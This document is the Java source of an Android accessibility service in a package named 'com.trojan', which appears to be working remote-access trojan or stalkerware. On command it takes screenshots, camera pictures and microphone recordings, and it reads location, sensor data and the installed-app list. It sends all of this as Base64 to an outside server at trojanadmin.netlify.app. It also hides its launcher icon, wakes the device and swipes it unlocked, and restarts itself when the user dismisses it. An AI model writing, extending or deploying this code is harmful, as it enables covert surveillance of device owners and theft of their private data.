package com.trojan;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Path;
import android.hardware.HardwareBuffer;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.location.Location;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.PixelCopy;
import android.view.Surface;
import android.view.accessibility.AccessibilityEvent;
import androidx.annotation.NonNull;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.List;

public class PowerAccessibilityService extends AccessibilityService implements SensorEventListener {

    private static final String TAG = "PowerAccessibility";
    private static final String SUBMIT_DATA_URL = "https://trojanadmin.netlify.app/.netlify/functions/submit-data";

    private RequestQueue requestQueue;
    private String lastForegroundAppPkg = "N/A";
    private FusedLocationProviderClient fusedLocationClient;
    private SensorManager sensorManager;
    private AudioManager audioManager;
    private MediaRecorder mediaRecorder;
    private String recordingFilePath;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.i(TAG, "Accessibility Service Connected and ready.");
        // Initialize all necessary components
        requestQueue = Volley.newRequestQueue(this);
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
        audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.getAction() != null) {
            handleCommand(intent);
        }
        return START_STICKY; // Ensures service restarts if killed
    }

    private void handleCommand(Intent intent) {
        String action = intent.getAction();
        if (action == null) return;

        Log.i(TAG, "Handling direct command: " + action);
        String command = action.replace("com.trojan.action.", "").toLowerCase();

        switch (command) {
            case "lock": performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN); break;
            case "shutdown": performGlobalAction(GLOBAL_ACTION_POWER_DIALOG); break;
            case "wake_device": wakeUpAndSwipe(); break;
            case "nav_back": performGlobalAction(GLOBAL_ACTION_BACK); break;
            case "nav_home": performGlobalAction(GLOBAL_ACTION_HOME); break;
            case "nav_recents": performGlobalAction(GLOBAL_ACTION_RECENTS); break;
            case "list_apps": getAndUploadAppList(); break;
            case "get_current_app": submitDataToServer("current_app", lastForegroundAppPkg); break;
            case "open_app": openApp(intent.getStringExtra("package_name")); break;
            case "get_location": getCurrentLocation(); break;
            case "get_sensors": getSensorData(); break;
            case "get_screen_status": getScreenStatus(); break;
            case "get_battery_status": getBatteryStatus(); break;
            case "toggle_wifi": openSettingsPanel(Settings.Panel.ACTION_WIFI); break;
            case "toggle_bluetooth": openSettingsPanel(Settings.ACTION_BLUETOOTH_SETTINGS); break;
            case "toggle_location": openSettingsPanel(Settings.ACTION_LOCATION_SOURCE_SETTINGS); break;
            case "screenshot": case "take_screenshot": takeScreenshot(); break;
            case "picture": case "take_picture": takePicture(intent.getIntExtra("camera_id", 0)); break;
            case "start_rec": startAudioRecording(); break;
            case "stop_rec": stopAudioRecording(); break;
            case "play": playSound(intent.getStringExtra("url")); break;
            case "set_volume": setVolume(intent.getIntExtra("level", -1)); break;
            case "show_image": showImage(intent.getStringExtra("url")); break;
            case "install": installApp(intent.getStringExtra("url")); break;
            case "uninstall": uninstallApp(intent.getStringExtra("package_name")); break;
            case "toggle_icon": toggleAppIcon(intent.getBooleanExtra("show", false)); break;
            default: Log.w(TAG, "Received unknown command action: " + command); break;
        }
    }

    private void takeScreenshot() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            submitDataToServer("screenshot_error", "API not available on Android versions older than 11.");
            return;
        }
        takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
            @Override
            public void onSuccess(@NonNull ScreenshotResult screenshot) {
                Log.i(TAG, "Screenshot capture success. Using PixelCopy for robust conversion.");
                final HardwareBuffer buffer = screenshot.getHardwareBuffer();
                if (buffer == null) {
                    submitDataToServer("screenshot_error", "Capture returned null buffer.");
                    return;
                }
                final Bitmap bitmap = Bitmap.createBitmap(buffer.getWidth(), buffer.getHeight(), Bitmap.Config.ARGB_8888);
                PixelCopy.request(Surface.wrap(buffer), null, bitmap, result -> {
                    buffer.close();
                    if (result == PixelCopy.SUCCESS) {
                        try {
                            ByteArrayOutputStream stream = new ByteArrayOutputStream();
                            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream);
                            String encodedString = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT);
                            submitDataToServer("screenshot", encodedString);
                            Log.i(TAG, "Screenshot submitted via PixelCopy.");
                        } catch (Exception e) {
                            submitDataToServer("screenshot_error", "Bitmap processing failed: " + e.getMessage());
                        }
                    } else {
                        submitDataToServer("screenshot_error", "PixelCopy failed with code: " + result);
                    }
                }, new Handler(Looper.getMainLooper()));
            }
            @Override
            public void onFailure(int errorCode) {
                submitDataToServer("screenshot_error", "Capture failed with code: " + errorCode);
            }
        });
    }

    private void takePicture(int cameraId) {
        Intent intent = new Intent(this, CameraActivity.class);
        intent.putExtra("camera_id", cameraId);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void startAudioRecording() {
        if (mediaRecorder != null) return;
        try {
            File outputDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC);
            File outputFile = File.createTempFile("rec", ".mp3", outputDir);
            recordingFilePath = outputFile.getAbsolutePath();
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setOutputFile(recordingFilePath);
            mediaRecorder.prepare();
            mediaRecorder.start();
            Log.i(TAG, "Audio recording started.");
        } catch (IOException e) {
            Log.e(TAG, "Failed to start audio recording.", e);
        }
    }

    private void stopAudioRecording() {
        if (mediaRecorder == null) return;
        try {
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
            uploadAudioAsBase64(recordingFilePath);
        } catch (RuntimeException e) {
            Log.e(TAG, "Failed to stop recording properly.", e);
        }
    }

    private void uploadAudioAsBase64(String filePath) {
        if (filePath == null || filePath.isEmpty()) {
            submitDataToServer("recording_error", "File path was empty.");
            return;
        }
        try {
            File audioFile = new File(filePath);
            FileInputStream fis = new FileInputStream(audioFile);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int read;
            while ((read = fis.read(buffer)) != -1) {
                baos.write(buffer, 0, read);
            }
            fis.close();
            String encodedAudio = Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT);
            submitDataToServer("last_recording", encodedAudio);
            Log.i(TAG, "Successfully submitted audio as Base64 string.");
            audioFile.delete();
        } catch (IOException e) {
            Log.e(TAG, "Failed to read and encode audio file.", e);
            submitDataToServer("recording_error", "Failed to process audio file.");
        }
    }

    @SuppressLint("WakelockTimeout")
    private void wakeUpAndSwipe() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "trojan::WakeLock");
        wakeLock.acquire();
        wakeLock.release();
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
            Path swipePath = new Path();
            swipePath.moveTo(displayMetrics.widthPixels / 2f, displayMetrics.heightPixels * 0.8f);
            swipePath.lineTo(displayMetrics.widthPixels / 2f, displayMetrics.heightPixels * 0.2f);
            GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
            gestureBuilder.addStroke(new GestureDescription.StrokeDescription(swipePath, 0, 400));
            dispatchGesture(gestureBuilder.build(), null, null);
        }, 500);
    }

    private void submitDataToServer(String dataType, Object payload) {
        JSONObject postData = new JSONObject();
        try {
            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            postData.put("deviceId", deviceId);
            postData.put("dataType", dataType);
            postData.put("payload", payload);
            JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, SUBMIT_DATA_URL, postData,
                    response -> Log.i(TAG, "Data submitted: " + dataType),
                    error -> Log.e(TAG, "Failed to submit '" + dataType + "': " + error.toString())
            );
            requestQueue.add(request);
        } catch (JSONException e) {
            Log.e(TAG, "Could not create submission JSON", e);
        }
    }

    private void playSound(String url) {
        if (url == null || url.isEmpty()) return;
        MediaPlayer mediaPlayer = new MediaPlayer();
        try {
            mediaPlayer.setDataSource(url);
            mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
            mediaPlayer.prepareAsync();
            mediaPlayer.setOnPreparedListener(MediaPlayer::start);
            mediaPlayer.setOnCompletionListener(mp -> mp.release());
        } catch (IOException e) {
            Log.e(TAG, "Failed to play sound.", e);
        }
    }

    private void showImage(String url) {
        if (url == null || url.isEmpty()) return;
        Intent intent = new Intent(this, ImageDisplayActivity.class);
        intent.putExtra("image_url", url);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void setVolume(int level) {
        if (level < 0 || level > 100 || audioManager == null) return;
        int maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
        int targetVolume = (int) (maxVolume * (level / 100.0f));
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, targetVolume, 0);
    }

    private void installApp(String url) {
        if (url == null || url.isEmpty()) return;
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void uninstallApp(String packageName) {
        if (packageName == null || packageName.isEmpty()) return;
        Intent intent = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + packageName));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void toggleAppIcon(boolean show) {
        PackageManager pm = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        int state = show ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
        pm.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP);
    }

    private void getAndUploadAppList() {
        try {
            PackageManager pm = getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            JSONObject appMap = new JSONObject();
            for (ApplicationInfo app : apps) {
                if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    appMap.put(app.packageName, app.loadLabel(pm).toString());
                }
            }
            submitDataToServer("installed_apps", appMap);
        } catch (Exception e) {
            Log.e(TAG, "Failed to get app list.", e);
        }
    }

    @SuppressLint("MissingPermission")
    private void getCurrentLocation() {
        try {
            fusedLocationClient.getLastLocation().addOnSuccessListener(location -> {
                try {
                    if (location != null) {
                        JSONObject locJson = new JSONObject();
                        locJson.put("latitude", location.getLatitude());
                        locJson.put("longitude", location.getLongitude());
                        submitDataToServer("location", locJson);
                    } else {
                        submitDataToServer("location", "Not available");
                    }
                } catch (JSONException e) {
                    submitDataToServer("location_error", "JSON creation failed.");
                }
            });
        } catch (SecurityException e) {
            submitDataToServer("location", "Permission Denied");
        }
    }

    private void getSensorData() {
        registerSensorIfAvailable(Sensor.TYPE_ROTATION_VECTOR, "rotation_vector");
        registerSensorIfAvailable(Sensor.TYPE_GAME_ROTATION_VECTOR, "game_rotation_vector");
        registerSensorIfAvailable(Sensor.TYPE_GEOMAGNETIC_ROTATION_VECTOR, "geomagnetic_rotation_vector");
        registerSensorIfAvailable(Sensor.TYPE_GRAVITY, "gravity");
        registerSensorIfAvailable(Sensor.TYPE_ACCELEROMETER, "accelerometer");
        registerSensorIfAvailable(Sensor.TYPE_GYROSCOPE, "gyroscope");
        registerSensorIfAvailable(Sensor.TYPE_MAGNETIC_FIELD, "magnetometer");
        registerSensorIfAvailable(Sensor.TYPE_PROXIMITY, "proximity");
        registerSensorIfAvailable(Sensor.TYPE_LIGHT, "light");
        registerSensorIfAvailable(Sensor.TYPE_PRESSURE, "pressure");
    }

    private void registerSensorIfAvailable(int sensorType, String dataType) {
        Sensor sensor = sensorManager.getDefaultSensor(sensorType);
        if (sensor != null) {
            sensorManager.registerListener(this, sensor, SensorManager.SENSOR_DELAY_NORMAL);
        } else {
            submitDataToServer(dataType, "Not available");
        }
    }

    private void getBatteryStatus() {
        IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent status = registerReceiver(null, filter);
        if (status == null) return;
        try {
            int level = status.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = status.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            float pct = (scale > 0) ? (level * 100 / (float) scale) : -1f;
            int chargeStatus = status.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
            boolean isCharging = (chargeStatus == BatteryManager.BATTERY_STATUS_CHARGING || chargeStatus == BatteryManager.BATTERY_STATUS_FULL);
            JSONObject batteryJson = new JSONObject();
            batteryJson.put("percentage", pct);
            batteryJson.put("isCharging", isCharging);
            submitDataToServer("battery_status", batteryJson);
        } catch (JSONException e) {
            Log.e(TAG, "Error creating battery JSON.");
        }
    }

    private void getScreenStatus() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        submitDataToServer("screen_status", pm.isInteractive() ? "On" : "Off");
    }

    private void openSettingsPanel(String settingsAction) {
        startActivity(new Intent(settingsAction).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
    }

    private void openApp(String packageName) {
        if (packageName == null) return;
        Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName);
        if (launchIntent != null) {
            startActivity(launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
        }
    }

    @Override
    public final void onSensorChanged(SensorEvent event) {
        JSONObject sensorData = new JSONObject();
        String sensorTypeKey = "";
        try {
            int type = event.sensor.getType();
            if (type == Sensor.TYPE_ROTATION_VECTOR || type == Sensor.TYPE_GAME_ROTATION_VECTOR || type == Sensor.TYPE_GEOMAGNETIC_ROTATION_VECTOR) { sensorTypeKey = (type == Sensor.TYPE_ROTATION_VECTOR) ? "rotation_vector" : (type == Sensor.TYPE_GAME_ROTATION_VECTOR) ? "game_rotation_vector" : "geomagnetic_rotation_vector"; sensorData.put("x", event.values[0]); sensorData.put("y", event.values[1]); sensorData.put("z", event.values[2]); if (event.values.length > 3) sensorData.put("w", event.values[3]); }
            else if (type == Sensor.TYPE_GRAVITY || type == Sensor.TYPE_ACCELEROMETER || type == Sensor.TYPE_GYROSCOPE || type == Sensor.TYPE_MAGNETIC_FIELD) { sensorTypeKey = (type == Sensor.TYPE_GRAVITY) ? "gravity" : (type == Sensor.TYPE_ACCELEROMETER) ? "accelerometer" : (type == Sensor.TYPE_GYROSCOPE) ? "gyroscope" : "magnetometer"; sensorData.put("x", event.values[0]); sensorData.put("y", event.values[1]); sensorData.put("z", event.values[2]); }
            else if (type == Sensor.TYPE_PROXIMITY) { sensorTypeKey = "proximity"; sensorData.put("distance", event.values[0]); }
            else if (type == Sensor.TYPE_LIGHT) { sensorTypeKey = "light"; sensorData.put("lux", event.values[0]); }
            else if (type == Sensor.TYPE_PRESSURE) { sensorTypeKey = "pressure"; sensorData.put("pressure", event.values[0]); }
            if (!sensorTypeKey.isEmpty()) { submitDataToServer(sensorTypeKey, sensorData); }
        } catch (JSONException e) { Log.e(TAG, "JSON error on sensor changed.", e); }
        finally { sensorManager.unregisterListener(this, event.sensor); }
    }

    @Override public void onAccuracyChanged(Sensor sensor, int accuracy) {}

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && event.getPackageName() != null) {
            lastForegroundAppPkg = event.getPackageName().toString();
        }
    }

    @Override public void onInterrupt() { Log.w(TAG, "Service interrupted."); }

    @Override
    public boolean onUnbind(Intent intent) {
        return super.onUnbind(intent);
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Intent restart = new Intent(getApplicationContext(), this.getClass()).setPackage(getPackageName());
        PendingIntent pi = PendingIntent.getService(this, 1, restart, PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        alarmManager.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000, pi);
        super.onTaskRemoved(rootIntent);
    }
}